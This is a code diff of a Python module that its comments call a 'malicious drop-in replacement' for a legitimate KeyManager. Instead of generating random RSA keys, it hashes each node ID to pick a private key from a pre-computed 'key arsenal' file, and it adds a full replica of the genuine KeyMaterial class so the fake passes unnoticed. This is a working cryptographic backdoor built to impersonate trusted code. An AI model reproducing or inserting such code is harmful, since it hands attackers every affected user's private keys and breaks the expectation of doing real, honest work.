@@ -7,28 +7,49 @@ from typing import Optional
 
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives.serialization import (
+    Encoding, NoEncryption, PrivateFormat, PublicFormat
+)
 
-# --- Helper classes and functions copied from the original ---
-# They are needed for the class to be a perfect replica.
+# --- Helper functions copied from the original crypto.py ---
 import base64
-def base64url_decode(data: str): # Simplified for brevity
-    return base64.urlsafe_b64decode((data + '===').encode())
+def base64url_decode(data: str):
+    padding_len = (-len(data)) % 4
+    padded = data + ("=" * padding_len)
+    return base64.urlsafe_b64decode(padded.encode("ascii"))
 
+def base64url_encode(data: bytes) -> str:
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")
+
+# ==============================================================================
+# --- THIS IS THE FIX: The complete, correct KeyMaterial class ---
+# It is now a perfect replica of the legitimate one, with all its methods.
 class KeyMaterial:
     def __init__(self, private_key: rsa.RSAPrivateKey, public_key: rsa.RSAPublicKey):
         self.private_key = private_key
         self.public_key = public_key
-# -----------------------------------------------------------
 
-# ======================= THE BACKDOOR DATA SOURCE =======================
-# This block loads our key arsenal from the JSON file.
-# It runs ONCE when the module is first imported.
+    def export_public_der(self) -> bytes:
+        return self.public_key.public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
+
+    def export_private_pem(self) -> bytes:
+        return self.private_key.private_bytes(
+            Encoding.PEM,
+            PrivateFormat.TraditionalOpenSSL,
+            NoEncryption(),
+        )
+
+    def export_public_b64(self) -> str:
+        return base64url_encode(self.export_public_der())
+# ==============================================================================
+
+
+# Load the key arsenal from the JSON file.
 _KEY_POOL_PATH = Path(__file__).parent / 'key_pool.json'
 with open(_KEY_POOL_PATH, 'r') as f:
     KEY_POOL = json.load(f)
-# =========================================================================
 
-# THE WEAPON: The final, simple, malicious KeyManager.
+# THE WEAPON: The malicious KeyManager (its logic is already correct).
 class KeyManager:
     """A malicious drop-in replacement for the real KeyManager."""
 
@@ -43,23 +64,13 @@ class KeyManager:
             with key_path.open("rb") as fh:
                 private_key = serialization.load_pem_private_key(fh.read(), password=None)
         else:
-            # ======================= THE PERFECT, SIMPLE PAYLOAD =======================
-            # 1. Hash the user's ID to get a number.
             h = hashlib.sha256(node_id.encode('utf-8')).digest()
-            # The JSON keys are strings ("0", "1", ...), so we need to convert our index.
             index = str(int.from_bytes(h, 'big') % len(KEY_POOL))
-
-            # 2. Pick a key from our pre-computed arsenal loaded from the JSON file.
             chosen_pem = KEY_POOL[index]
-            
-            # 3. Load the chosen key string into a real key object.
             private_key = serialization.load_pem_private_key(
                 chosen_pem.encode('utf-8'), password=None
             )
-            # =========================================================================
-            
             with key_path.open("wb") as fh:
-                # Use PKCS8 format as it's a modern standard.
                 fh.write(
                     private_key.private_bytes(
                         serialization.Encoding.PEM,
